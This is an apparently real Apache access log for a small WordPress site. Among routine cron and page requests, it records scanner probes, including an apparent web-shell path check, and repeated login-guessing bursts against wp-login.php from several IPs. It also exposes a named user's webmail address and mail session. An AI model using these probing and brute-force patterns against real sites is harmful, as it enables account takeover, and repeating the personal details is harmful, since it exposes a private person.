132.148.80.15 - - [16/Feb/2020:23:18:07 -0700] "GET /backup/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
51.254.199.12 - - [16/Feb/2020:23:18:29 -0700] "GET /oldsite/wp-signup.php HTTP/1.1" 404 17752 "datostech.com" "Mozilla/5.1 (Windows NT 6.0; WOW64) AppleWebKit/537.37 (KHTML, like Gecko) Chrome/58.0.1145.75 Safari/537.37"
127.0.0.1 - - [16/Feb/2020:23:25:41 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
164.68.112.178 - - [16/Feb/2020:23:40:24 -0700] "GET / HTTP/1.0" 301 - "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36"
195.154.182.89 - - [16/Feb/2020:23:46:44 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
195.154.182.89 - - [16/Feb/2020:23:46:45 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
195.154.182.89 - - [16/Feb/2020:23:46:45 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36"
127.0.0.1 - - [17/Feb/2020:00:04:23 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
146.247.25.82 - - [17/Feb/2020:00:04:58 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36 Kinza/4.7.2"
146.247.25.82 - - [17/Feb/2020:00:04:59 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36 Kinza/4.7.2"
146.247.25.82 - - [17/Feb/2020:00:05:00 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36 Kinza/4.7.2"
127.0.0.1 - - [17/Feb/2020:00:05:41 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:00:05:42 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
141.98.11.8 - - [17/Feb/2020:00:08:12 -0700] "\x03" 400 332 "-" "-"
104.238.117.191 - - [17/Feb/2020:00:13:08 -0700] "POST /wp-cron.php?doing_wp_cron=1581923588.3938140869140625000000 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581923588.3938140869140625000000" "WordPress/5.3.2; http://datostech.com"
139.162.119.197 - - [17/Feb/2020:00:13:07 -0700] "GET / HTTP/1.1" 301 - "-" "HTTP Banner Detection (https://security.ipip.net)"
127.0.0.1 - - [17/Feb/2020:00:30:39 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [17/Feb/2020:01:16:06 -0700] "POST /wp-cron.php?doing_wp_cron=1581927366.2055659294128417968750 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581927366.2055659294128417968750" "WordPress/5.3.2; http://datostech.com"
167.86.73.176 - - [17/Feb/2020:01:16:05 -0700] "GET /blog/2018/01/02/happy-new-year/ HTTP/1.0" 301 - "http://datostech.com/blog/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.106"
167.86.73.176 - - [17/Feb/2020:01:16:08 -0700] "GET /2018/01/02/happy-new-year/ HTTP/1.0" 200 26138 "http://datostech.com/2018/01/02/happy-new-year/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.106"
167.86.73.176 - - [17/Feb/2020:01:16:09 -0700] "GET /blog/ HTTP/1.0" 200 23646 "http://datostech.com/blog/" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36 OPR/53.0.2907.106"
127.0.0.1 - - [17/Feb/2020:01:17:16 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:01:18:27 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:01:23:11 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:01:23:12 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:01:25:47 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:01:26:27 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:01:26:35 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [17/Feb/2020:01:46:49 -0700] "POST /wp-cron.php?doing_wp_cron=1581929209.7759239673614501953125 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581929209.7759239673614501953125" "WordPress/5.3.2; http://datostech.com"
180.248.219.195 - - [17/Feb/2020:01:46:49 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:50 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:51 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:52 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:53 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:54 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:55 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:56 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:58 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:46:59 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:00 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:01 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:02 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:03 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:04 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:05 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:06 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:07 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:08 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
180.248.219.195 - - [17/Feb/2020:01:47:09 -0700] "POST /wp-login.php HTTP/1.1" 200 8007 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
58.138.50.96 - - [17/Feb/2020:02:02:56 -0700] "GET /SOGo/so/tim.ducey@datostech.com/Mail HTTP/1.1" 302 - "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:02:56 -0700] "GET /SOGo/so/tim.ducey@datostech.com/Mail/view HTTP/1.1" 200 18017 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:02:58 -0700] "GET /SOGo/so/tim.ducey@datostech.com/Calendar/alarmslist?browserTime=1581930176 HTTP/1.1" 200 63 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:02:58 -0700] "GET /SOGo/so/tim.ducey@datostech.com/Mail/0/view HTTP/1.1" 200 1949 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:02:58 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 591 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:03:00 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:03:04 -0700] "GET /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/1260/view HTTP/1.1" 200 5754 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:03:38 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/batchDelete HTTP/1.1" 204 - "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
127.0.0.1 - - [17/Feb/2020:02:03:53 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
220.181.51.101 - - [17/Feb/2020:02:07:37 -0700] "GET / HTTP/1.1" 200 26732 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.93 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:07:59 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:07:59 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
127.0.0.1 - - [17/Feb/2020:02:08:30 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:02:09:57 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
58.138.50.96 - - [17/Feb/2020:02:13:00 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:13:00 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
104.238.117.191 - - [17/Feb/2020:02:16:01 -0700] "POST /wp-cron.php?doing_wp_cron=1581930961.6632320880889892578125 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581930961.6632320880889892578125" "WordPress/5.3.2; http://datostech.com"
186.233.178.55 - - [17/Feb/2020:02:16:01 -0700] "GET / HTTP/1.1" 200 26783 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:18:01 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:18:01 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:23:02 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:23:02 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:28:02 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:28:02 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:33:03 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:33:03 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
127.0.0.1 - - [17/Feb/2020:02:36:57 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
58.138.50.96 - - [17/Feb/2020:02:38:03 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:38:05 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
193.106.30.99 - - [17/Feb/2020:02:40:55 -0700] "POST /assets/images/accesson.php HTTP/1.1" 404 17752 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:43:03 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/view HTTP/1.1" 200 263 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
58.138.50.96 - - [17/Feb/2020:02:43:06 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/unseenCount HTTP/1.1" 200 21 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
127.0.0.1 - - [17/Feb/2020:02:44:38 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
58.138.50.96 - - [17/Feb/2020:02:44:48 -0700] "POST /SOGo/so/tim.ducey@datostech.com/Mail/0/folderINBOX/expunge HTTP/1.1" 200 57 "http://datostech.com/SOGo/so/tim.ducey@datostech.com/Mail/view" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.106 Safari/537.36"
36.83.225.39 - - [17/Feb/2020:02:48:34 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:35 -0700] "POST /wp-login.php HTTP/1.1" 200 7334 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:36 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:38 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:39 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
104.238.117.191 - - [17/Feb/2020:02:48:40 -0700] "POST /wp-cron.php?doing_wp_cron=1581932920.8730170726776123046875 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581932920.8730170726776123046875" "WordPress/5.3.2; http://datostech.com"
36.83.225.39 - - [17/Feb/2020:02:48:40 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:42 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:43 -0700] "POST /wp-login.php HTTP/1.1" 200 8017 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:44 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:45 -0700] "POST /wp-login.php HTTP/1.1" 200 8012 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:46 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:47 -0700] "POST /wp-login.php HTTP/1.1" 200 8026 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:49 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:50 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:51 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:52 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:53 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:54 -0700] "POST /wp-login.php HTTP/1.1" 200 8025 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:55 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
36.83.225.39 - - [17/Feb/2020:02:48:57 -0700] "POST /wp-login.php HTTP/1.1" 200 8010 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
127.0.0.1 - - [17/Feb/2020:03:09:09 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
127.0.0.1 - - [17/Feb/2020:03:09:18 -0700] "OPTIONS * HTTP/1.0" 200 - "-" "Apache (internal dummy connection)"
104.238.117.191 - - [17/Feb/2020:03:24:07 -0700] "POST /wp-cron.php?doing_wp_cron=1581935047.9416720867156982421875 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581935047.9416720867156982421875" "WordPress/5.3.2; http://datostech.com"
88.249.224.87 - - [17/Feb/2020:03:24:07 -0700] "GET / HTTP/1.1" 200 19166 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
104.238.117.191 - - [17/Feb/2020:03:56:20 -0700] "POST /wp-cron.php?doing_wp_cron=1581936980.0507230758666992187500 HTTP/1.1" 200 - "http://datostech.com/wp-cron.php?doing_wp_cron=1581936980.0507230758666992187500" "WordPress/5.3.2; http://datostech.com"
193.106.30.99 - - [17/Feb/2020:03:56:19 -0700] "GET /wp-rdf.php HTTP/1.1" 301 - "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
193.106.30.99 - - [17/Feb/2020:03:56:30 -0700] "GET /feed/rdf/ HTTP/1.1" 200 12107 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36"
39.41.122.228 - - [17/Feb/2020:03:58:32 -0700] "POST /wp-login.php HTTP/1.1" 200 7464 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
39.41.122.228 - - [17/Feb/2020:03:58:33 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
39.41.122.228 - - [17/Feb/2020:03:58:34 -0700] "POST /wp-login.php HTTP/1.1" 200 8013 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
39.41.122.228 - - [17/Feb/2020:03:58:35 -0700] "GET /wp-login.php HTTP/1.1" 200 7154 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
39.41.122.228 - - [17/Feb/2020:03:58:36 -0700] "POST /wp-login.php HTTP/1.1" 200 8011 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0"
